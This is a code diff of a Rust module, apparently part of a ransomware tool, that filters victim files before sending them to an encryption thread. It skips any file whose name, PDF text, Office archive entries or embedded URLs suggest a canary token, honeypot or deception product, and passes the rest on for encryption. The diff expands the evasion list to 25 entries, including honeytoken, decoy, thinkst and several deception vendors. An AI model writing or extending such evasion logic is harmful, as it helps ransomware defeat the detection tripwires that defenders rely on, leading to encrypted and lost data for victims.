@@ -1,16 +1,18 @@
-use flume::{Receiver, Sender};
-use log::{debug, error, info};
-use regex::bytes::{Regex, RegexSet};
 use std::{
-    io::{Cursor, Read},
+    io::{self, Cursor, Read},
     path::{Path, PathBuf},
     sync::{Arc, LazyLock},
-    thread,
+    thread::{self, JoinHandle},
 };
+
+use anyhow::Context;
+use coconut_crab_lib::file::read_file_data;
+use flume::{Receiver, Sender};
+use regex::bytes::{Regex, RegexSet};
+use tracing::{debug, error, info};
 use zip::read::ZipArchive;
 
 use crate::{client::recv_path, config, img::img_from_bytes};
-use coconut_crab_lib::file::get_file_data;
 
 static INTERESTING_STRING_REGEX: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"[A-Za-z0-9:./-]{6,}").expect("Invalid Regex"));
@@ -25,17 +27,33 @@ static SUSPICIOUS_KEYWORD_SET: LazyLock<RegexSet> = LazyLock::new(|| {
     )
     .expect("Invalid RegexSet")
 });
-pub static SUSPICIOUS_KEYWORDS: LazyLock<[String; 9]> = LazyLock::new(|| {
+pub static SUSPICIOUS_KEYWORDS: LazyLock<[String; 25]> = LazyLock::new(|| {
     [
         lc!("canary"),
         lc!("canaries"),
+        lc!("honeypot"),
+        lc!("honeytoken"),
+        lc!("honeyfile"),
+        lc!("honeydoc"),
+        lc!("decoy"),
+        lc!("ransomware"),
+        lc!("thinkst"),
+        lc!("includepicture"),
         lc!("huntress"),
         lc!("exampleit"),
+        lc!("james brodsky"),
         lc!("splunk"),
         lc!("stressboi"),
-        lc!("james brodsky"),
-        lc!("ransomware"),
+        lc!("genie9"),
+        lc!("bigmind"),
         lc!("nccgroup"),
+        lc!("attivo"),
+        lc!("threatwise"),
+        lc!("acalvio"),
+        lc!("trapx"),
+        lc!("illusive"),
+        lc!("countercraft"),
+        lc!("varonis"),
     ]
 });
 
@@ -55,30 +73,19 @@ pub const fn canary_active() -> bool {
     config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES
 }
 
-#[derive(Debug)]
-struct ZipAnalysisError(String);
-
-impl std::fmt::Display for ZipAnalysisError {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        write!(f, "{}", self.0)
-    }
-}
-
-impl std::error::Error for ZipAnalysisError {}
-
 pub fn filter_canary(
     receiver: Receiver<Arc<PathBuf>>,
     sender: Sender<Arc<PathBuf>>,
-) -> thread::JoinHandle<()> {
+) -> io::Result<JoinHandle<()>> {
     debug!("Starting canary filter thread");
-    thread::spawn(move || {
+    thread::Builder::new().spawn(move || {
         loop {
             let Some(file_path) = recv_path(&receiver) else {
                 return;
             };
 
             if config::AVOID_KEYWORDS && analyze_keywords(&file_path.to_string_lossy()) {
-                info!("File path contained keyword: {file_path:?}");
+                info!(path = %file_path.display(), "File path contained keyword");
                 continue;
             }
 
@@ -109,9 +116,9 @@ pub fn filter_canary(
 }
 
 fn forward(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>, reason: &str) {
-    debug!("Forwarding for encryption ({reason}): {file_path:?}");
+    debug!(path = %file_path.display(), reason, "Forwarding for encryption");
     if let Err(error) = sender.send(Arc::clone(file_path)) {
-        error!("Failed to send path to encryption thread: {error}");
+        error!(error = ?error, "Failed to send path to encryption thread");
     }
 }
 
@@ -122,14 +129,14 @@ fn read_capped_or_forward(
     unreadable_reason: &str,
     oversize_reason: &str,
 ) -> Option<Vec<u8>> {
-    match get_file_data(file_path.as_ref(), max_size) {
+    match read_file_data(file_path.as_ref(), max_size) {
         Ok(Some(data)) => Some(data),
         Ok(None) => {
             forward(sender, file_path, oversize_reason);
             None
         }
         Err(error) => {
-            error!("Error during file data retrieval: {error:?}");
+            error!(error = ?error, "Error during file data retrieval");
             forward(sender, file_path, unreadable_reason);
             None
         }
@@ -148,7 +155,10 @@ fn filter_pdf(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
     };
 
     if analyze_file_data(&file_data, config::AVOID_KEYWORDS, config::AVOID_URLS) {
-        info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
+        info!(
+            path = %file_path.display(),
+            "File flagged by analysis. Not sending file for encryption"
+        );
     } else {
         forward(sender, file_path, "clean pdf");
     }
@@ -173,13 +183,16 @@ fn filter_office_zip(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
         config::AVOID_URLS,
     ) {
         Ok(true) => {
-            info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
+            info!(
+                path = %file_path.display(),
+                "File flagged by analysis. Not sending file for encryption"
+            );
         }
         Ok(false) => {
             forward(sender, file_path, "clean zip");
         }
         Err(error) => {
-            error!("Error analyzing zip file: {error}");
+            error!(error = ?error, "Error analyzing zip file");
             forward(sender, file_path, "unanalyzable zip");
         }
     }
@@ -199,7 +212,7 @@ fn filter_broken_image(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) 
     if img_from_bytes(&file_data).is_ok() {
         forward(sender, file_path, "decodable image");
     } else {
-        info!("Not sending file for encryption: {file_path:?}");
+        info!(path = %file_path.display(), "Not sending file for encryption");
     }
 }
 
@@ -222,7 +235,7 @@ fn analyze_keywords(string: &str) -> bool {
         info!("String flagged by analysis due to keyword");
         return true;
     }
-    debug!("String not flagged by analysis: {string}");
+    debug!(string = %string, "String not flagged by analysis");
     false
 }
 
@@ -234,8 +247,8 @@ fn analyze_urls(string: &[u8]) -> bool {
         let domain = domain.as_bytes();
         if analyze_domain(domain) {
             info!(
-                "URL flagged by analysis due to domain: {}",
-                String::from_utf8_lossy(domain)
+                domain = %String::from_utf8_lossy(domain),
+                "URL flagged by analysis due to domain"
             );
             return true;
         }
@@ -250,14 +263,14 @@ fn analyze_domain(domain: &[u8]) -> bool {
         .any(|candidate| candidate.as_bytes().eq_ignore_ascii_case(domain));
     if known {
         debug!(
-            "Domain is a known office document domain: {}",
-            String::from_utf8_lossy(domain)
+            domain = %String::from_utf8_lossy(domain),
+            "Domain is a known office document domain"
         );
         false
     } else {
         debug!(
-            "Domain not a known office document domain: {}",
-            String::from_utf8_lossy(domain)
+            domain = %String::from_utf8_lossy(domain),
+            "Domain not a known office document domain"
         );
         true
     }
@@ -269,85 +282,92 @@ fn analyze_zip_bytes(
     zipped_file_max_size: u64,
     avoid_keywords: bool,
     avoid_urls: bool,
-) -> Result<bool, ZipAnalysisError> {
-    let mut archive = ZipArchive::new(Cursor::new(data)).map_err(|error| {
-        error!("Error opening file as zip archive: {error:?}");
-        ZipAnalysisError(error.to_string())
+) -> anyhow::Result<bool> {
+    let mut archive = ZipArchive::new(Cursor::new(data)).with_context(|| {
+        format!(
+            "failed to open file as zip archive: {}",
+            file_path.display()
+        )
     })?;
 
-    debug!("Zip archive contains {} files", archive.len());
+    debug!(entries = archive.len(), "Zip archive opened");
     if archive.len() > MAX_ZIP_ENTRIES {
         debug!(
-            "Truncating zip analysis to first {MAX_ZIP_ENTRIES} of {} entries: {}",
-            archive.len(),
-            file_path.display()
+            entries = archive.len(),
+            limit = MAX_ZIP_ENTRIES,
+            path = %file_path.display(),
+            "Truncating zip analysis"
         );
     }
     let mut total_analyzed: u64 = 0;
     for zipped_file_num in 0..archive.len().min(MAX_ZIP_ENTRIES) {
         if total_analyzed >= MAX_ZIP_TOTAL_BYTES {
             debug!(
-                "Zip analysis total budget ({MAX_ZIP_TOTAL_BYTES}) reached, stopping fail-open: {}",
-                file_path.display()
+                budget = MAX_ZIP_TOTAL_BYTES,
+                path = %file_path.display(),
+                "Zip analysis total budget reached, stopping fail-open"
             );
             break;
         }
-        let mut entry = archive.by_index(zipped_file_num).map_err(|error| {
-            error!("Error opening zipped file: {error:?}");
-            ZipAnalysisError(error.to_string())
+        let mut entry = archive.by_index(zipped_file_num).with_context(|| {
+            format!(
+                "failed to open zipped file {zipped_file_num} of {}",
+                file_path.display()
+            )
         })?;
 
         if entry.size() <= zipped_file_max_size {
             debug!(
-                "Entry size ({}) is below max analysis size ({})",
-                entry.size(),
-                zipped_file_max_size
+                size = entry.size(),
+                max = zipped_file_max_size,
+                "Entry size below max analysis size"
             );
 
             let prealloc = entry.size().min(zipped_file_max_size);
             let mut zipped_file_data = Vec::with_capacity(usize::try_from(prealloc).unwrap_or(0));
             entry
                 .by_ref()
-                .take(zipped_file_max_size + 1)
+                .take(zipped_file_max_size.saturating_add(1))
                 .read_to_end(&mut zipped_file_data)
-                .map_err(|error| {
-                    error!("Error reading zipped file: {error}");
-                    ZipAnalysisError(error.to_string())
+                .with_context(|| {
+                    format!(
+                        "failed to read zipped file: {}",
+                        String::from_utf8_lossy(entry.name_raw())
+                    )
                 })?;
             debug!(
-                "Successfully read {} bytes from zipped file: {}",
-                zipped_file_data.len(),
-                String::from_utf8_lossy(entry.name_raw())
+                bytes = zipped_file_data.len(),
+                entry = %String::from_utf8_lossy(entry.name_raw()),
+                "Successfully read zipped file"
             );
 
-            if u64::try_from(zipped_file_data.len()).is_ok_and(|len| len > zipped_file_max_size) {
+            let zipped_len = u64::try_from(zipped_file_data.len()).unwrap_or(u64::MAX);
+            if zipped_len > zipped_file_max_size {
                 debug!(
-                    "Entry decompressed beyond max size ({}), skipping: {}",
-                    zipped_file_data.len(),
-                    String::from_utf8_lossy(entry.name_raw())
+                    size = zipped_file_data.len(),
+                    max = zipped_file_max_size,
+                    entry = %String::from_utf8_lossy(entry.name_raw()),
+                    "Entry decompressed beyond max size, skipping"
                 );
                 continue;
             }
-            total_analyzed += zipped_file_data.len() as u64;
+            total_analyzed += zipped_len;
 
             if analyze_file_data(&zipped_file_data, avoid_keywords, avoid_urls) {
                 info!(
-                    "Zipped file flagged by analysis: {}",
-                    String::from_utf8_lossy(entry.name_raw())
+                    entry = %String::from_utf8_lossy(entry.name_raw()),
+                    "Zipped file flagged by analysis"
                 );
                 return Ok(true);
             }
         } else {
             debug!(
-                "Entry size ({}) is above max analysis size ({})",
-                entry.size(),
-                zipped_file_max_size
+                size = entry.size(),
+                max = zipped_file_max_size,
+                "Entry size above max analysis size"
             );
         }
     }
-    debug!(
-        "Zip archive not flagged by analysis: {}",
-        file_path.display()
-    );
+    debug!(path = %file_path.display(), "Zip archive not flagged by analysis");
     Ok(false)
 }
